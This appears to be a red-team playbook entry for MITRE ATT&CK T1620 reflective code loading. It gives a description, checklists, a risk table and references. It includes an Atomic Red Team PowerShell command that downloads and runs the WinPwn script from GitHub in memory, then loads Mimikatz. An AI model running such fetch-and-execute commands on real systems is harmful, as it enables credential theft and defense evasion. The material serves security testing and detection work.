---
name: "T1620_reflective-code-loading"
description: "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1620
  - defense-evasion
  - linux
  - macos
  - windows
technique_id: "T1620"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
platforms:
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1620"
tech_stack:
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-693
chains_with: []
prerequisites: []
severity_boost: {}
---

# T1620 Reflective Code Loading

## High-Level Description

Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., Shared Modules).

Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode). For example, the `Assembly.Load()` method executed by PowerShell may be abused to load raw code into the running process.

Reflective code injection is very similar to Process Injection except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.

## Kill Chain Phase

- Defense Evasion (TA0005)

**Platforms:** Linux, macOS, Windows

## What to Check

- [ ] Identify if Reflective Code Loading technique is applicable to target environment
- [ ] Check Linux systems for indicators of Reflective Code Loading
- [ ] Check macOS systems for indicators of Reflective Code Loading
- [ ] Check Windows systems for indicators of Reflective Code Loading
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: WinPwn - Reflectively load Mimik@tz into memory

Reflectively load Mimik@tz into memory technique via function of WinPwn

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
mimiload -consoleoutput -noninteractive
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Reflective Code Loading by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1620 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

No specific mitigations documented for this technique.

## Detection

### Detection Strategy for Reflective Code Loading

## Risk Assessment

| Finding                                      | Severity | Impact          |
| -------------------------------------------- | -------- | --------------- |
| Reflective Code Loading technique applicable | High     | Defense Evasion |

## CWE Categories

| CWE ID  | Title                        |
| ------- | ---------------------------- |
| CWE-693 | Protection Mechanism Failure |

## References

- [00sec Droppers](https://0x00sec.org/t/super-stealthy-droppers/3715)
- [S1 Custom Shellcode Tool](https://www.sentinelone.com/blog/building-a-custom-tool-for-shellcode-analysis/)
- [Mandiant BYOL](https://www.mandiant.com/resources/bring-your-own-land-novel-red-teaming-technique)
- [S1 Old Rat New Tricks](https://www.sentinelone.com/blog/teaching-an-old-rat-new-tricks/)
- [MDSec Detecting DOTNET](https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/)
- [Microsoft AssemblyLoad](https://learn.microsoft.com/dotnet/api/system.reflection.assembly.load)
- [Intezer ACBackdoor](https://www.intezer.com/blog/research/acbackdoor-analysis-of-a-new-multiplatform-backdoor/)
- [Stuart ELF Memory](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html)
- [Introducing Donut](https://thewover.github.io/Introducing-Donut/)
- [Atomic Red Team - T1620](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1620)
- [MITRE ATT&CK - T1620](https://attack.mitre.org/techniques/T1620)
